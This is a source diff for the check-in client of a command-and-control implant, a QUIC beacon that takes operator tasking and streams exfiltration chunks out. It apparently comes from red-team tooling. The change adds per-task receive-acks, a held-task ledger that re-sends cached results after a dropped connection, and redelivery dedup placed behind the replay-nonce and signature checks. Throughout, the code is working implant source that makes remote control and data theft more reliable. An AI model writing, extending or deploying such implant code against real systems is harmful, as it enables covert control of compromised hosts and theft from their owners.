@@ -39,7 +39,8 @@ internal static class QuicCheckIn
         setup.Config.ClassVerbs,
         setup.Log,
         setup.Nonces,
-        setup.Cadence);
+        setup.Cadence,
+        setup.Held);
 }
 
 /// <summary>
@@ -72,6 +73,7 @@ internal sealed class QuicBeacon : ICheckInClient
     private readonly Cadence? _cadence;
     private readonly FrontedPivots? _fronted;
     private readonly TaskNonceTracker _nonces;
+    private readonly HeldTaskLedger _held;
 
     public QuicBeacon(
         EgressEndpoints egress,
@@ -84,7 +86,8 @@ internal sealed class QuicBeacon : ICheckInClient
         IReadOnlyList<string> classVerbs,
         TextWriter log,
         TaskNonceTracker? nonces = null,
-        Cadence? cadence = null)
+        Cadence? cadence = null,
+        HeldTaskLedger? held = null)
     {
         _egress = egress;
         _implantId = implantId;
@@ -101,6 +104,7 @@ internal sealed class QuicBeacon : ICheckInClient
         _classVerbs = classVerbs;
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
+        _held = held ?? new HeldTaskLedger();
     }
 
     /// <summary>
@@ -144,6 +148,10 @@ internal sealed class QuicBeacon : ICheckInClient
             catch (Exception ex)
             {
                 _log.WriteLine($"beacon stream ended: {ex.Message}");
+                // The connection died mid-flight: results written on it may
+                // never have been read, so the next connection re-sends them
+                // (first-wins server-side).
+                _held.InvalidateDeliveries();
             }
 
             // Every non-OK handshake status is permanent for this artifact:
@@ -209,6 +217,10 @@ internal sealed class QuicBeacon : ICheckInClient
             Version = new ProtocolVersion { Major = 1, Minor = 0 },
             ImplantId = _implantId,
             ReplayNonces = true,
+            // The receive-ack arm (architecture.md Sec 10.3), offered the same
+            // way: an echoing server gets an ack for every parsed task, and a
+            // stream that dies before the ack redelivers it.
+            TaskAcks = true,
         };
         handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
         await wire.WriteFramesAsync(
@@ -227,6 +239,8 @@ internal sealed class QuicBeacon : ICheckInClient
             return BeaconCycleResult.Terminal;
         }
         _nonces.Negotiated = response.ReplayNonces;
+        // The receive-ack arm is per connection (architecture.md Sec 10.3).
+        var acks = response.TaskAcks;
         _log.WriteLine($"handshake ok: engagement={response.EngagementId}, replay-nonces={response.ReplayNonces}");
 
         // Tasking loop: the gRPC stream's own shape over the message
@@ -238,6 +252,18 @@ internal sealed class QuicBeacon : ICheckInClient
         var writeGate = new SemaphoreSlim(1, 1);
         var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
         using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+
+        // Results whose delivery died with an earlier connection ride this
+        // one first (architecture.md Sec 10.3 -- the dispatch strand); the
+        // server records first-wins, so a duplicate is absorbed.
+        foreach (var remembered in _held.Undelivered())
+        {
+            await WriteFrameAsync(
+                wire, writeGate, ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
+                cancellationToken);
+            _held.MarkDelivered(remembered.TaskId);
+        }
+
         try
         {
             var inbound = firstInbound;
@@ -257,6 +283,13 @@ internal sealed class QuicBeacon : ICheckInClient
                     }
 
                     var task = TaskRequest.Parser.ParseFrom(frame.Payload);
+
+                    // The dispatch strand's ack half (architecture.md Sec
+                    // 10.3): delivery evidence for the parsed frame, before
+                    // anything runs. The dedup half lives inside
+                    // AcceptTaskingAsync, after verification.
+                    if (acks)
+                        await WriteFrameAsync(wire, writeGate, AckFrame(task.TaskId), cancellationToken);
                     await AcceptTaskingAsync(wire, writeGate, liveChannels, channelsGone.Token, task, cancellationToken);
                 }
 
@@ -304,9 +337,9 @@ internal sealed class QuicBeacon : ICheckInClient
             if (_fronted is null || !_fronted.Knows(targetId))
             {
                 _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
-                await WriteFrameAsync(wire, writeGate,
-                    ResultFrame(task, TaskOutcome.Failed,
-                        $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"),
+                await ReportResultAsync(
+                    wire, writeGate, task.TaskId, TaskOutcome.Failed,
+                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed",
                     cancellationToken);
                 return;
             }
@@ -334,11 +367,37 @@ internal sealed class QuicBeacon : ICheckInClient
             output = cause;
             chunks = Array.Empty<ExfilChunk>();
         }
+        else if (_held.Contains(task.TaskId))
+        {
+            // The dispatch strand's dedup half (architecture.md Sec 10.3),
+            // deliberately AFTER verification: the replay defense stays ahead
+            // of the ledger, so a verbatim replay of a held task still falls
+            // at the nonce floor (or the signature) and is refused on the
+            // task. A redelivery that cleared verification re-sends the
+            // cached result unconditionally -- a redelivery implies the
+            // server holds no recorded result, and a duplicate against a
+            // completed task is a no-op there (first-wins). Nothing
+            // re-executes.
+            if (_held.TryGetResult(task.TaskId, out var heldOutcome, out var heldOutput))
+            {
+                await ReportResultAsync(wire, writeGate, task.TaskId, heldOutcome, heldOutput, cancellationToken);
+                _log.WriteLine($"task {task.TaskId} redelivered; answered from the ledger without re-running");
+            }
+            else
+            {
+                // Held but unfinished (a channel that died with its stream, a
+                // task still running): nothing to re-send and nothing to
+                // re-run.
+                _log.WriteLine($"task {task.TaskId} redelivered while still held; re-acked without re-running");
+            }
+            return;
+        }
         else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
         {
             // The streaming shape: the task opens a channel and the handler
             // runs in the background, reporting its own final TaskResult; the
             // loop keeps reading while it runs.
+            _held.Hold(task.TaskId);
             StartChannel(wire, writeGate, liveChannels, task, channelHandler, channelLifetime);
             return;
         }
@@ -352,7 +411,12 @@ internal sealed class QuicBeacon : ICheckInClient
             (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
         }
 
-        await WriteFrameAsync(wire, writeGate, ResultFrame(task, outcome, output), cancellationToken);
+        // Held from here on whatever the outcome was -- a refused task is
+        // parsed and answered too, and its redelivery is answered from the
+        // cache the same way (the channel branch held above, before its
+        // early return).
+        _held.Hold(task.TaskId);
+        await ReportResultAsync(wire, writeGate, task.TaskId, outcome, output, cancellationToken);
 
         // Out-of-band exfil chunks follow the TaskResult on the same stream.
         foreach (var chunk in chunks)
@@ -402,6 +466,8 @@ internal sealed class QuicBeacon : ICheckInClient
         {
             var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
             await WriteFrameAsync(wire, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
+            _held.Remember(task.TaskId, outcome, output);
+            _held.MarkDelivered(task.TaskId);
             _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
         }
         catch (Exception ex)
@@ -520,16 +586,43 @@ internal sealed class QuicBeacon : ICheckInClient
     }
 
     private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
+        => ResultFrame(task.TaskId, outcome, output);
+
+    private static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
         => new()
         {
             Payload = ByteString.CopyFrom(new TaskResult
             {
-                TaskId = task.TaskId,
+                TaskId = taskId,
                 Outcome = outcome,
                 Output = output,
             }.ToByteArray()),
             Kind = FrameKind.TaskResult,
         };
+
+    // The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
+    // one parsed task, sent before anything executes.
+    private static Frame AckFrame(string taskId)
+        => new()
+        {
+            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
+            Kind = FrameKind.TaskAck,
+        };
+
+    // Writes one task result and caches it in the held-task ledger, the same
+    // bookkeeping the other stream clients keep.
+    private async Task ReportResultAsync(
+        QuicWire wire,
+        SemaphoreSlim writeGate,
+        string taskId,
+        TaskOutcome outcome,
+        string output,
+        CancellationToken cancellationToken)
+    {
+        await WriteFrameAsync(wire, writeGate, ResultFrame(taskId, outcome, output), cancellationToken);
+        _held.Remember(taskId, outcome, output);
+        _held.MarkDelivered(taskId);
+    }
 
     // One frame at a time through the gate: the dispatch loop and every live
     // channel's output pumps share the stream, so all of them write through
